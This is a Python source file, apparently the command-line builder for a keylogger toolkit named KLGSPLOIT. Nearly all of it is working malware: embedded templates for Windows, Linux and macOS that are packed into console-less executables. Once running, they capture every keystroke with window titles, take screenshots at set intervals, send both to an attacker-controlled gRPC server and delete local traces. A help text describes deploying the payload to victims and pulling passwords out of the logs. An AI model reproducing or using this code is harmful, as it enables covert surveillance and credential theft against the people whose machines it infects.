import sys
import os

# Add parent directory to path so we can import libs
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    import PyInstaller.__main__ as pyinstaller
except Exception:
    pyinstaller = None  # PyInstaller may not be installed at runtime; only required for build steps

from libs import *

class KlgMalware:
    def __init__(self, output_dir, script, filename, extention, configs, pltfrm):
        self.pltfrm = pltfrm
        self.output_dir = output_dir
        self.script = script
        self.filename = filename
        self.extention = extention
        self.configs = configs

    def build_standard(self):
        if pyinstaller is None:
            print("[!] PyInstaller is not installed. Please install it to build the executable.")
            return False

        output_path = f"{self.output_dir}/{self.filename}.{self.extention}"

        import tempfile
        import os
        
        temp_script_path = os.path.join(tempfile.gettempdir(), f"klg_temp_{self.pltfrm}.py")
        with open(temp_script_path, 'w') as f:
            f.write(self.script)

        pyinstaller_args = [
            '--onefile',
            '--noconsole',
            '--name', f"{self.filename}",
            '--distpath', f"{self.output_dir}",
            '--workpath', 'build_temp',
            '--specpath', 'build_spec',
            '--clean',
            '--log-level=WARN',
            temp_script_path,
        ]

        try:
            pyinstaller.run(pyinstaller_args)
            print(f"[+] Executable built successfully at: {output_path}")
            if os.path.exists(temp_script_path):
                os.remove(temp_script_path)
            return True
        except Exception as e:
            print(f"[!] Build failed: {e}")
            if os.path.exists(temp_script_path):
                os.remove(temp_script_path)
            return False

    def build_advanced(self):
        """Build executable with advanced features (gRPC, screenshots, intervals)"""
        if pyinstaller is None:
            print("[!] PyInstaller is not installed. Please install it to build the executable.")
            return False

        output_path = f"{self.output_dir}/{self.filename}.{self.extention}"

        import tempfile
        import os
        
        temp_script_path = os.path.join(tempfile.gettempdir(), f"klg_adv_temp_{self.pltfrm}.py")
        with open(temp_script_path, 'w') as f:
            f.write(self.script)

        pyinstaller_args = [
            '--onefile',
            '--noconsole',
            '--name', f"{self.filename}",
            '--distpath', f"{self.output_dir}",
            '--workpath', 'build_temp',
            '--specpath', 'build_spec',
            '--clean',
            '--log-level=WARN',
            '--hidden-import=grpc',
            '--hidden-import=grpc._channel',
            temp_script_path,
        ]

        try:
            pyinstaller.run(pyinstaller_args)
            print(f"[+] Advanced executable built successfully at: {output_path}")
            if os.path.exists(temp_script_path):
                os.remove(temp_script_path)
            return True
        except Exception as e:
            print(f"[!] Build failed: {e}")
            if os.path.exists(temp_script_path):
                os.remove(temp_script_path)
            return False


# define functions depending on OS
def get_platform():
    import platform
    os_name = platform.system().lower()
    if 'windows' in os_name:
        return 'win'
    elif 'linux' in os_name:
        return 'lnx'
    elif 'darwin' in os_name:
        return 'mac'
    else:
        return 'unknown'
    
platform = get_platform()

def getCurrentUsecase():
    args = sys.argv
    if '--start' in args:
        return '1'
    elif '--serve' in args:
        return 'start_server'
    elif '--build' in args:
        return '3'
    elif '--build-adv' in args:
        return '3_advanced'
    elif '--classify' in args:
        return '4'
    elif '--screenshot' in args:
        return '5'
    else:
        return 'help'

usecase = getCurrentUsecase()

# ============================================
# ARGUMENT PARSING HELPERS
# ============================================
def parse_arg(prefix):
    for arg in sys.argv:
        if arg.startswith(prefix + ':'):
            return arg.split(':', 1)[1]
    return None

def get_output_dir():
    return parse_arg('--output') or parse_arg('-output') or './dist'

def get_filename():
    return parse_arg('-fname') or parse_arg('--fname') or 'klgsploit_payload'

def get_extention():
    return parse_arg('extention') or 'exe' if parse_arg('platform') == 'win' else 'out'

def get_target_platform():
    return parse_arg('platform') or platform

def get_host():
    return parse_arg('host') or 'localhost'

def get_port():
    return parse_arg('port') or '50051'

def get_screenshot_interval():
    return int(parse_arg('--screenshot-interval') or '60')

def get_logfile_interval():
    return int(parse_arg('--logfile-interval') or '30')

def get_input_file():
    return parse_arg('input') or 'keylog.txt'

# ============================================
# SCRIPT TEMPLATES FOR EACH PLATFORM
# ============================================

# --- WINDOWS SCRIPTS ---
SCRIPT_WIN_STANDARD = '''
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from libs.winlog import loggerFunction as loggerFunctionWindows

def main():
    print("[*] Starting Windows keylogger...")
    loggerFunctionWindows()

if __name__ == "__main__":
    main()
'''

# FIX: use cln.configure() so the right server is targeted,
#      pass grpc_sender= into loggerFunction so on_press actually sends,
#      and add .png extension to screenshot filenames.
#      Screenshots are now sent to attacker via gRPC.
SCRIPT_WIN_ADVANCED_TEMPLATE = '''
import sys
import os
import threading
import time
import tempfile
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from libs.winlog import loggerFunction as loggerFunctionWindows
from libs import cln
from libs.capture import take_screenshot

# Configuration
GRPC_HOST = "{host}"
GRPC_PORT = {port}
SCREENSHOT_INTERVAL = {screenshot_interval}

# Point the gRPC client at the attacker server
cln.configure(GRPC_HOST, GRPC_PORT)

def screenshot_loop():
    """Take screenshots at regular intervals and send to attacker server."""
    # Use temp folder to avoid leaving traces
    temp_folder = os.path.join(tempfile.gettempdir(), ".cache")
    os.makedirs(temp_folder, exist_ok=True)
    
    while True:
        try:
            fname = f"sc_{{int(time.time())}}.png"
            filepath = take_screenshot(platform='win', folder=temp_folder, filename=fname)
            if filepath and os.path.exists(filepath):
                # Send screenshot to attacker server via gRPC
                cln.send_screenshot_non_blocking(filepath)
                # Clean up local file after sending
                try:
                    os.remove(filepath)
                except Exception:
                    pass
        except Exception:
            pass
        time.sleep(SCREENSHOT_INTERVAL)

def main():
    screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
    screenshot_thread.start()

    # Pass cln.send_key_non_blocking as grpc_sender so every key press
    # is forwarded to the attacker server directly from on_press().
    loggerFunctionWindows(grpc_sender=cln.send_key_non_blocking)

if __name__ == "__main__":
    main()
'''

# --- LINUX SCRIPTS ---
SCRIPT_LNX_STANDARD = '''
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from libs.linlog import loggerFunction as loggerFunctionLinux

def main():
    print("[*] Starting Linux keylogger...")
    loggerFunctionLinux()

if __name__ == "__main__":
    main()
'''

SCRIPT_LNX_ADVANCED_TEMPLATE = '''
import sys
import os
import threading
import time
import tempfile
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from libs.linlog import loggerFunction as loggerFunctionLinux
from libs import cln
from libs.capture import take_screenshot

# Configuration
GRPC_HOST = "{host}"
GRPC_PORT = {port}
SCREENSHOT_INTERVAL = {screenshot_interval}

# Point the gRPC client at the attacker server
cln.configure(GRPC_HOST, GRPC_PORT)

def screenshot_loop():
    """Take screenshots at regular intervals and send to attacker server."""
    # Use temp folder to avoid leaving traces
    temp_folder = os.path.join(tempfile.gettempdir(), ".cache")
    os.makedirs(temp_folder, exist_ok=True)
    
    while True:
        try:
            fname = f"sc_{{int(time.time())}}.png"
            filepath = take_screenshot(platform='lnx', folder=temp_folder, filename=fname)
            if filepath and os.path.exists(filepath):
                # Send screenshot to attacker server via gRPC
                cln.send_screenshot_non_blocking(filepath)
                # Clean up local file after sending
                try:
                    os.remove(filepath)
                except Exception:
                    pass
        except Exception:
            pass
        time.sleep(SCREENSHOT_INTERVAL)

def main():
    screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
    screenshot_thread.start()

    loggerFunctionLinux(grpc_sender=cln.send_key_non_blocking)

if __name__ == "__main__":
    main()
'''

# --- MACOS SCRIPTS ---
SCRIPT_MAC_STANDARD = '''
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from libs.maclog import loggerFunction as loggerFunctionMac

def main():
    print("[*] Starting macOS keylogger...")
    loggerFunctionMac()

if __name__ == "__main__":
    main()
'''

SCRIPT_MAC_ADVANCED_TEMPLATE = '''
import sys
import os
import threading
import time
import tempfile
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from libs.maclog import loggerFunction as loggerFunctionMac
from libs import cln
from libs.capture import take_screenshot

# Configuration
GRPC_HOST = "{host}"
GRPC_PORT = {port}
SCREENSHOT_INTERVAL = {screenshot_interval}

# Point the gRPC client at the attacker server
cln.configure(GRPC_HOST, GRPC_PORT)

def screenshot_loop():
    """Take screenshots at regular intervals and send to attacker server."""
    # Use temp folder to avoid leaving traces
    temp_folder = os.path.join(tempfile.gettempdir(), ".cache")
    os.makedirs(temp_folder, exist_ok=True)
    
    while True:
        try:
            fname = f"sc_{{int(time.time())}}.png"
            filepath = take_screenshot(platform='mac', folder=temp_folder, filename=fname)
            if filepath and os.path.exists(filepath):
                # Send screenshot to attacker server via gRPC
                cln.send_screenshot_non_blocking(filepath)
                # Clean up local file after sending
                try:
                    os.remove(filepath)
                except Exception:
                    pass
        except Exception:
            pass
        time.sleep(SCREENSHOT_INTERVAL)

def main():
    screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
    screenshot_thread.start()

    loggerFunctionMac(grpc_sender=cln.send_key_non_blocking)

if __name__ == "__main__":
    main()
'''

# ============================================
# STANDALONE EXE SCRIPT TEMPLATES
# These templates embed all necessary code for standalone executables
# that don't require the libs folder at runtime.
# Uses manual protobuf wire format encoding for minimal dependencies.
# ============================================

STANDALONE_WIN_ADVANCED_TEMPLATE = '''
# -*- coding: utf-8 -*-
"""
KLGSPLOIT Standalone Windows Payload
Self-contained keylogger + screenshot with gRPC exfiltration
"""
import sys
import os
import threading
import time
import tempfile
import hashlib
import platform as plat
import struct
from datetime import datetime

# ============ Protobuf Wire Format Helpers ============
def encode_varint(value):
    """Encode an integer as a varint."""
    bits = value & 0x7f
    value >>= 7
    result = b""
    while value:
        result += bytes([0x80 | bits])
        bits = value & 0x7f
        value >>= 7
    result += bytes([bits])
    return result

def encode_string(field_number, value):
    """Encode a string field in protobuf wire format."""
    if isinstance(value, str):
        value = value.encode('utf-8')
    tag = (field_number << 3) | 2  # wire type 2 = length-delimited
    return encode_varint(tag) + encode_varint(len(value)) + value

def encode_bytes(field_number, value):
    """Encode a bytes field in protobuf wire format."""
    tag = (field_number << 3) | 2  # wire type 2 = length-delimited
    return encode_varint(tag) + encode_varint(len(value)) + value

def build_keylog_request(message):
    """Build KeylogRequest protobuf message. Field 1 = message (string)."""
    return encode_string(1, message)

def build_screenshot_request(image_data, filename, timestamp, client_id):
    """Build ScreenshotRequest protobuf message."""
    # Field 1 = image_data (bytes), Field 2 = filename, Field 3 = timestamp, Field 4 = client_id
    msg = encode_bytes(1, image_data)
    msg += encode_string(2, filename)
    msg += encode_string(3, timestamp)
    msg += encode_string(4, client_id)
    return msg

# ============ gRPC Client (embedded) ============
try:
    import grpc
    HAS_GRPC = True
except ImportError:
    HAS_GRPC = False

# gRPC client configuration
_host = "{host}"
_port = {port}
_client_id = None
_channel = None
_keylog_stub = None
_screenshot_stub = None

def _generate_client_id():
    info = f"{{plat.node()}}-{{plat.system()}}-{{plat.machine()}}"
    return hashlib.md5(info.encode()).hexdigest()[:12]

def _ensure_channel():
    global _channel, _keylog_stub, _screenshot_stub
    if _channel is None and HAS_GRPC:
        _channel = grpc.insecure_channel(f"{{_host}}:{{_port}}")
        _keylog_stub = _channel.unary_unary(
            '/KeylogService/SendKeylog',
            request_serializer=lambda x: x,
            response_deserializer=lambda x: x
        )
        _screenshot_stub = _channel.unary_unary(
            '/KeylogService/SendScreenshot',
            request_serializer=lambda x: x,
            response_deserializer=lambda x: x
        )

def send_key_grpc(text):
    if not HAS_GRPC:
        return
    try:
        _ensure_channel()
        # Build proper protobuf message
        msg = build_keylog_request(text)
        _keylog_stub(msg)
    except Exception:
        pass

def send_screenshot_grpc(filepath):
    global _client_id
    if not HAS_GRPC:
        return
    try:
        if not os.path.exists(filepath):
            return
        with open(filepath, 'rb') as f:
            data = f.read()
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.basename(filepath)
        if _client_id is None:
            _client_id = _generate_client_id()
        
        _ensure_channel()
        # Build proper protobuf message
        msg = build_screenshot_request(data, filename, timestamp, _client_id)
        _screenshot_stub(msg)
    except Exception:
        pass

# ============ Screenshot (embedded) ============
try:
    from PIL import ImageGrab
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

def take_screenshot(folder, filename):
    if not HAS_PIL:
        return None
    try:
        os.makedirs(folder, exist_ok=True)
        filepath = os.path.join(folder, filename)
        screenshot = ImageGrab.grab()
        screenshot.save(filepath)
        return filepath
    except Exception:
        return None

# ============ Keylogger (embedded) ============
try:
    from pynput import keyboard
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False

try:
    import pygetwindow as gw
    HAS_GW = True
except ImportError:
    HAS_GW = False

def get_active_window():
    if not HAS_GW:
        return "Unknown"
    try:
        win = gw.getActiveWindow()
        return win.title if win and win.title else "Desktop"
    except Exception:
        return "Desktop"

last_window = ""

def on_press(key):
    global last_window
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    current_window = get_active_window()
    
    if hasattr(key, 'char') and key.char:
        key_str = key.char
        key_type = 'char'
    else:
        key_str = str(key).replace('Key.', '')
        key_type = 'special'
    
    # Send via gRPC
    message = f"[WIN] {{key_str}} | {{key_type}} | {{current_window}} | {{timestamp}}"
    threading.Thread(target=send_key_grpc, args=(message,), daemon=True).start()
    
    # Log locally to temp
    try:
        log_path = os.path.join(tempfile.gettempdir(), ".klg.dat")
        with open(log_path, 'a', encoding='utf-8') as f:
            if current_window != last_window:
                f.write(f"\\n--- Window: [{{current_window}}] at {{timestamp}} ---\\n")
                last_window = current_window
            f.write(f"[{{timestamp}}] {{key_str}}\\n")
    except Exception:
        pass

# ============ Main ============
SCREENSHOT_INTERVAL = {screenshot_interval}

def screenshot_loop():
    temp_folder = os.path.join(tempfile.gettempdir(), ".cache")
    os.makedirs(temp_folder, exist_ok=True)
    while True:
        try:
            fname = f"sc_{{int(time.time())}}.png"
            filepath = take_screenshot(temp_folder, fname)
            if filepath and os.path.exists(filepath):
                send_screenshot_grpc(filepath)
                try:
                    os.remove(filepath)
                except Exception:
                    pass
        except Exception:
            pass
        time.sleep(SCREENSHOT_INTERVAL)

def main():
    if HAS_PYNPUT:
        screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
        screenshot_thread.start()
        
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

if __name__ == "__main__":
    main()
'''

STANDALONE_LNX_ADVANCED_TEMPLATE = '''
# -*- coding: utf-8 -*-
"""
KLGSPLOIT Standalone Linux Payload
Self-contained keylogger + screenshot with gRPC exfiltration
"""
import sys
import os
import threading
import time
import tempfile
import hashlib
import platform as plat
import struct
from datetime import datetime

# ============ Protobuf Wire Format Helpers ============
def encode_varint(value):
    """Encode an integer as a varint."""
    bits = value & 0x7f
    value >>= 7
    result = b""
    while value:
        result += bytes([0x80 | bits])
        bits = value & 0x7f
        value >>= 7
    result += bytes([bits])
    return result

def encode_string(field_number, value):
    """Encode a string field in protobuf wire format."""
    if isinstance(value, str):
        value = value.encode('utf-8')
    tag = (field_number << 3) | 2  # wire type 2 = length-delimited
    return encode_varint(tag) + encode_varint(len(value)) + value

def encode_bytes(field_number, value):
    """Encode a bytes field in protobuf wire format."""
    tag = (field_number << 3) | 2  # wire type 2 = length-delimited
    return encode_varint(tag) + encode_varint(len(value)) + value

def build_keylog_request(message):
    """Build KeylogRequest protobuf message. Field 1 = message (string)."""
    return encode_string(1, message)

def build_screenshot_request(image_data, filename, timestamp, client_id):
    """Build ScreenshotRequest protobuf message."""
    msg = encode_bytes(1, image_data)
    msg += encode_string(2, filename)
    msg += encode_string(3, timestamp)
    msg += encode_string(4, client_id)
    return msg

# ============ gRPC Client (embedded) ============
try:
    import grpc
    HAS_GRPC = True
except ImportError:
    HAS_GRPC = False

_host = "{host}"
_port = {port}
_client_id = None
_channel = None
_keylog_stub = None
_screenshot_stub = None

def _generate_client_id():
    info = f"{{plat.node()}}-{{plat.system()}}-{{plat.machine()}}"
    return hashlib.md5(info.encode()).hexdigest()[:12]

def _ensure_channel():
    global _channel, _keylog_stub, _screenshot_stub
    if _channel is None and HAS_GRPC:
        _channel = grpc.insecure_channel(f"{{_host}}:{{_port}}")
        _keylog_stub = _channel.unary_unary(
            '/KeylogService/SendKeylog',
            request_serializer=lambda x: x,
            response_deserializer=lambda x: x
        )
        _screenshot_stub = _channel.unary_unary(
            '/KeylogService/SendScreenshot',
            request_serializer=lambda x: x,
            response_deserializer=lambda x: x
        )

def send_key_grpc(text):
    if not HAS_GRPC:
        return
    try:
        _ensure_channel()
        msg = build_keylog_request(text)
        _keylog_stub(msg)
    except Exception:
        pass

def send_screenshot_grpc(filepath):
    global _client_id
    if not HAS_GRPC:
        return
    try:
        if not os.path.exists(filepath):
            return
        with open(filepath, 'rb') as f:
            data = f.read()
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.basename(filepath)
        if _client_id is None:
            _client_id = _generate_client_id()
        
        _ensure_channel()
        msg = build_screenshot_request(data, filename, timestamp, _client_id)
        _screenshot_stub(msg)
    except Exception:
        pass

# ============ Screenshot (embedded) ============
try:
    import mss
    import mss.tools
    HAS_MSS = True
except ImportError:
    HAS_MSS = False

def take_screenshot(folder, filename):
    if not HAS_MSS:
        return None
    try:
        os.makedirs(folder, exist_ok=True)
        filepath = os.path.join(folder, filename)
        with mss.mss() as sct:
            sct.shot(mon=-1, output=filepath)
        return filepath
    except Exception:
        return None

# ============ Keylogger (embedded) ============
try:
    from pynput import keyboard
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False

try:
    from Xlib import display, X
    HAS_XLIB = True
except ImportError:
    HAS_XLIB = False

def get_active_window():
    if not HAS_XLIB:
        return "Unknown"
    try:
        d = display.Display()
        root = d.screen().root
        NET_ACTIVE_WINDOW = d.intern_atom('_NET_ACTIVE_WINDOW')
        prop = root.get_full_property(NET_ACTIVE_WINDOW, X.AnyPropertyType)
        if not prop:
            return "Desktop"
        win_id = prop.value[0]
        if win_id == 0:
            return "Desktop"
        window = d.create_resource_object('window', win_id)
        NET_WM_NAME = d.intern_atom('_NET_WM_NAME')
        wm_name_prop = window.get_full_property(NET_WM_NAME, X.AnyPropertyType)
        if wm_name_prop:
            name = wm_name_prop.value
            if isinstance(name, bytes):
                return name.decode('utf-8', errors='ignore')
            return str(name)
        return window.get_wm_name() or "Desktop"
    except Exception:
        return "Desktop"

last_window = ""

def on_press(key):
    global last_window
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    current_window = get_active_window()
    
    if hasattr(key, 'char') and key.char:
        key_str = key.char
        key_type = 'char'
    else:
        key_str = str(key).replace('Key.', '')
        key_type = 'special'
    
    message = f"[LNX] {{key_str}} | {{key_type}} | {{current_window}} | {{timestamp}}"
    threading.Thread(target=send_key_grpc, args=(message,), daemon=True).start()
    
    try:
        log_path = os.path.join(tempfile.gettempdir(), ".klg.dat")
        with open(log_path, 'a', encoding='utf-8') as f:
            if current_window != last_window:
                f.write(f"\\n--- Window: [{{current_window}}] at {{timestamp}} ---\\n")
                last_window = current_window
            f.write(f"[{{timestamp}}] {{key_str}}\\n")
    except Exception:
        pass

# ============ Main ============
SCREENSHOT_INTERVAL = {screenshot_interval}

def screenshot_loop():
    temp_folder = os.path.join(tempfile.gettempdir(), ".cache")
    os.makedirs(temp_folder, exist_ok=True)
    while True:
        try:
            fname = f"sc_{{int(time.time())}}.png"
            filepath = take_screenshot(temp_folder, fname)
            if filepath and os.path.exists(filepath):
                send_screenshot_grpc(filepath)
                try:
                    os.remove(filepath)
                except Exception:
                    pass
        except Exception:
            pass
        time.sleep(SCREENSHOT_INTERVAL)

def main():
    if HAS_PYNPUT:
        screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
        screenshot_thread.start()
        
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

if __name__ == "__main__":
    main()
'''

STANDALONE_MAC_ADVANCED_TEMPLATE = '''
# -*- coding: utf-8 -*-
"""
KLGSPLOIT Standalone macOS Payload
Self-contained keylogger + screenshot with gRPC exfiltration
"""
import sys
import os
import threading
import time
import tempfile
import subprocess
import hashlib
import platform as plat
import struct
from datetime import datetime

# ============ Protobuf Wire Format Helpers ============
def encode_varint(value):
    """Encode an integer as a varint."""
    bits = value & 0x7f
    value >>= 7
    result = b""
    while value:
        result += bytes([0x80 | bits])
        bits = value & 0x7f
        value >>= 7
    result += bytes([bits])
    return result

def encode_string(field_number, value):
    """Encode a string field in protobuf wire format."""
    if isinstance(value, str):
        value = value.encode('utf-8')
    tag = (field_number << 3) | 2  # wire type 2 = length-delimited
    return encode_varint(tag) + encode_varint(len(value)) + value

def encode_bytes(field_number, value):
    """Encode a bytes field in protobuf wire format."""
    tag = (field_number << 3) | 2  # wire type 2 = length-delimited
    return encode_varint(tag) + encode_varint(len(value)) + value

def build_keylog_request(message):
    """Build KeylogRequest protobuf message. Field 1 = message (string)."""
    return encode_string(1, message)

def build_screenshot_request(image_data, filename, timestamp, client_id):
    """Build ScreenshotRequest protobuf message."""
    msg = encode_bytes(1, image_data)
    msg += encode_string(2, filename)
    msg += encode_string(3, timestamp)
    msg += encode_string(4, client_id)
    return msg

# ============ gRPC Client (embedded) ============
try:
    import grpc
    HAS_GRPC = True
except ImportError:
    HAS_GRPC = False

_host = "{host}"
_port = {port}
_client_id = None
_channel = None
_keylog_stub = None
_screenshot_stub = None

def _generate_client_id():
    info = f"{{plat.node()}}-{{plat.system()}}-{{plat.machine()}}"
    return hashlib.md5(info.encode()).hexdigest()[:12]

def _ensure_channel():
    global _channel, _keylog_stub, _screenshot_stub
    if _channel is None and HAS_GRPC:
        _channel = grpc.insecure_channel(f"{{_host}}:{{_port}}")
        _keylog_stub = _channel.unary_unary(
            '/KeylogService/SendKeylog',
            request_serializer=lambda x: x,
            response_deserializer=lambda x: x
        )
        _screenshot_stub = _channel.unary_unary(
            '/KeylogService/SendScreenshot',
            request_serializer=lambda x: x,
            response_deserializer=lambda x: x
        )

def send_key_grpc(text):
    if not HAS_GRPC:
        return
    try:
        _ensure_channel()
        msg = build_keylog_request(text)
        _keylog_stub(msg)
    except Exception:
        pass

def send_screenshot_grpc(filepath):
    global _client_id
    if not HAS_GRPC:
        return
    try:
        if not os.path.exists(filepath):
            return
        with open(filepath, 'rb') as f:
            data = f.read()
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.basename(filepath)
        if _client_id is None:
            _client_id = _generate_client_id()
        
        _ensure_channel()
        msg = build_screenshot_request(data, filename, timestamp, _client_id)
        _screenshot_stub(msg)
    except Exception:
        pass

# ============ Screenshot (embedded) ============
def take_screenshot(folder, filename):
    try:
        os.makedirs(folder, exist_ok=True)
        filepath = os.path.join(folder, filename)
        result = subprocess.run(['screencapture', '-x', filepath], capture_output=True, timeout=10)
        if result.returncode == 0 and os.path.exists(filepath):
            return filepath
    except Exception:
        pass
    return None

# ============ Keylogger (embedded) ============
try:
    from pynput import keyboard
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False

try:
    from AppKit import NSWorkspace
    HAS_APPKIT = True
except ImportError:
    HAS_APPKIT = False

def get_active_window():
    if not HAS_APPKIT:
        return "Unknown"
    try:
        workspace = NSWorkspace.sharedWorkspace()
        active_app = workspace.frontmostApplication()
        return active_app.localizedName() if active_app else "Desktop"
    except Exception:
        return "Desktop"

last_window = ""

def on_press(key):
    global last_window
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    current_window = get_active_window()
    
    if hasattr(key, 'char') and key.char:
        key_str = key.char
        key_type = 'char'
    else:
        key_str = str(key).replace('Key.', '')
        key_type = 'special'
    
    message = f"[MAC] {{key_str}} | {{key_type}} | {{current_window}} | {{timestamp}}"
    threading.Thread(target=send_key_grpc, args=(message,), daemon=True).start()
    
    try:
        log_path = os.path.join(tempfile.gettempdir(), ".klg.dat")
        with open(log_path, 'a', encoding='utf-8') as f:
            if current_window != last_window:
                f.write(f"\\n--- Window: [{{current_window}}] at {{timestamp}} ---\\n")
                last_window = current_window
            f.write(f"[{{timestamp}}] {{key_str}}\\n")
    except Exception:
        pass

# ============ Main ============
SCREENSHOT_INTERVAL = {screenshot_interval}

def screenshot_loop():
    temp_folder = os.path.join(tempfile.gettempdir(), ".cache")
    os.makedirs(temp_folder, exist_ok=True)
    while True:
        try:
            fname = f"sc_{{int(time.time())}}.png"
            filepath = take_screenshot(temp_folder, fname)
            if filepath and os.path.exists(filepath):
                send_screenshot_grpc(filepath)
                try:
                    os.remove(filepath)
                except Exception:
                    pass
        except Exception:
            pass
        time.sleep(SCREENSHOT_INTERVAL)

def main():
    if HAS_PYNPUT:
        screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
        screenshot_thread.start()
        
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

if __name__ == "__main__":
    main()
'''

# ============================================
# MAIN EXECUTION LOGIC
# ============================================

def print_banner():
    banner = """
   ▄█   ▄█▄  ▄█          ▄██████▄     ▄████████    ▄███████▄  ▄█        ▄██████▄   ▄█      ███     
  ███ ▄███▀ ███         ███    ███   ███    ███   ███    ███ ███       ███    ███ ███  ▀█████████▄ 
  ███▐██▀   ███         ███    █▀    ███    █▀    ███    ███ ███       ███    ███ ███▌    ▀███▀▀██ 
 ▄█████▀    ███        ▄███          ███          ███    ███ ███       ███    ███ ███▌     ███   ▀ 
▀▀█████▄    ███       ▀▀███ ████▄  ▀███████████ ▀█████████▀  ███       ███    ███ ███▌     ███     
  ███▐██▄   ███         ███    ███          ███   ███        ███       ███    ███ ███      ███     
  ███ ▀███▄ ███▌    ▄   ███    ███    ▄█    ███   ███        ███▌    ▄ ███    ███ ███      ███     
  ███   ▀█▀ █████▄▄██   ████████▀   ▄████████▀   ▄████▀      █████▄▄██  ▀██████▀  █▀      ▄████▀   
  ▀         ▀                                                ▀                                     
    """
    print(banner)
    print("  by pengux8 (aka) wail sari bey and contributors")
    print("  - Anes Ragoub | Ines Allag | Amani Sahraoui\n")

def print_help():
    print_banner()
    help_text = """
Keylogger toolkit v2.0 - Now with Screenshot gRPC Exfiltration!

Dependencies:
    pip install pynput pillow mss grpcio grpcio-tools pyinstaller pygetwindow python-xlib

Usage:
    Help message:
        python klgsploit_cli.py --help

    Usage 1 - Start keylogger locally:
        python klgsploit_cli.py --start

    Usage 2 - Start attacker server (receives keylogs + screenshots):
        python klgsploit_cli.py --serve host:<host> port:<port_number>
        
        The server will:
        - Receive keylog messages from victim machines
        - Receive and save screenshots to ./received_screenshots/<client_id>/

    Usage 3 - Generate standard executable (local logging only):
        python klgsploit_cli.py --build platform:<win/lnx/mac> --output:<directory> -fname:<filename> extention:<exe/out/app>

    Usage 3 Advanced - Generate standalone EXE with gRPC exfiltration:
        python klgsploit_cli.py --build-adv platform:<win/lnx/mac> --output:<directory> -fname:<filename> extention:<exe/out/app> host:<host> port:<port> --screenshot-interval:<seconds>
        
        The generated EXE will:
        - Capture keystrokes and send them to attacker server via gRPC
        - Take screenshots at specified interval and send to attacker server
        - Be completely standalone (no libs folder needed)
        - Clean up screenshots after sending (no traces on victim)

    Usage 4 - Classify log file (extract emails/passwords):
        python klgsploit_cli.py --classify input:<path_to_logfile>

    Usage 5 - Take screenshot locally:
        python klgsploit_cli.py --screenshot platform:<win/lnx/mac> --output:<directory> -fname:<filename>

Example workflow:
    1. Start server:    python klgsploit_cli.py --serve host:0.0.0.0 port:50051
    2. Build payload:   python klgsploit_cli.py --build-adv platform:win host:YOUR_IP port:50051 --screenshot-interval:30
    3. Deploy payload to victim
    4. Receive keylogs and screenshots on your server
"""
    print(help_text)

def run_start():
    """Start keylogger on current platform"""
    print(f"[*] Starting keylogger on platform: {platform}")
    if platform == 'win':
        loggerFunctionWindows()
    elif platform == 'lnx':
        loggerFunctionLinux()
    elif platform == 'mac':
        loggerFunctionMac()
    else:
        print(f"[!] Unsupported platform: {platform}")

def run_serve():
    """Start gRPC server"""
    host = get_host()
    port = get_port()
    print(f"[*] Starting gRPC server on {host}:{port}")
    server = KeylogServer()
    server.serve(host=host, port=int(port))

def run_build_standard():
    target = get_target_platform()
    output_dir = get_output_dir()
    filename = get_filename()
    ext = get_extention()
    
    print(f"[*] Building standard executable for platform: {target}")
    print(f"    Output: {output_dir}/{filename}.{ext}")
    
    if target == 'win':
        script = SCRIPT_WIN_STANDARD
    elif target == 'lnx':
        script = SCRIPT_LNX_STANDARD
    elif target == 'mac':
        script = SCRIPT_MAC_STANDARD
    else:
        print(f"[!] Unsupported target platform: {target}")
        return
    
    malware = KlgMalware(
        output_dir=output_dir,
        script=script,
        filename=filename,
        extention=ext,
        configs={},
        pltfrm=target
    )
    malware.build_standard()

def run_build_advanced():
    target = get_target_platform()
    output_dir = get_output_dir()
    filename = get_filename()
    ext = get_extention()
    host = get_host()
    port = get_port()
    screenshot_interval = get_screenshot_interval()
    
    print(f"[*] Building advanced standalone executable for platform: {target}")
    print(f"    Output: {output_dir}/{filename}.{ext}")
    print(f"    gRPC Server: {host}:{port}")
    print(f"    Screenshot interval: {screenshot_interval}s")
    print(f"    Mode: Standalone EXE (self-contained, no libs required)")
    
    # Use standalone templates for EXE builds
    if target == 'win':
        script = STANDALONE_WIN_ADVANCED_TEMPLATE.format(
            host=host, port=port, screenshot_interval=screenshot_interval
        )
    elif target == 'lnx':
        script = STANDALONE_LNX_ADVANCED_TEMPLATE.format(
            host=host, port=port, screenshot_interval=screenshot_interval
        )
    elif target == 'mac':
        script = STANDALONE_MAC_ADVANCED_TEMPLATE.format(
            host=host, port=port, screenshot_interval=screenshot_interval
        )
    else:
        print(f"[!] Unsupported target platform: {target}")
        return
    
    malware = KlgMalware(
        output_dir=output_dir,
        script=script,
        filename=filename,
        extention=ext,
        configs={'host': host, 'port': port, 'screenshot_interval': screenshot_interval},
        pltfrm=target
    )
    malware.build_advanced()

def run_classify():
    input_file = get_input_file()
